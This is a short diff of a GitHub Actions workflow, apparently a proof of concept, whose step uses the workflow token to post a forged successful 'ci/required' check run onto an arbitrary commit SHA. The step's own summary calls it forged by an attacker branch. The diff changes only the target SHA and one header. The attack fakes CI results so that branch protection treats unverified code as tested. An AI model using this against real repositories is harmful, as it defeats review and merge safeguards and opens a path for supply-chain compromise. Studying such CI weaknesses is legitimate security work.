@@ -8,4 +8,4 @@ jobs:
     steps:
       - name: forge required check on arbitrary sha
         run: |
-          curl -sS -X POST             -H "Authorization: Bearer ${{ github.token }}"             -H "Accept: application/vnd.github+json"             -H "X-GitHub-Api-Version: 2022-11-28"             https://api.github.com/repos/${{ github.repository }}/check-runs             -d '{"name":"ci/required","head_sha":"13329433164e64c55b08b26ccadf17b77e1057ba","status":"completed","conclusion":"success","output":{"title":"forged","summary":"forged by attacker branch on a foreign sha"}}'
+          curl -sS -X POST             -H "Authorization: Bearer ${{ github.token }}"             -H "Accept: application/vnd.github+json"             https://api.github.com/repos/${{ github.repository }}/check-runs             -d '{"name":"ci/required","head_sha":"d8c070579d0d700b033e52f9fa34863af6572bce","status":"completed","conclusion":"success","output":{"title":"forged","summary":"posted by attacker branch on foreign sha"}}'
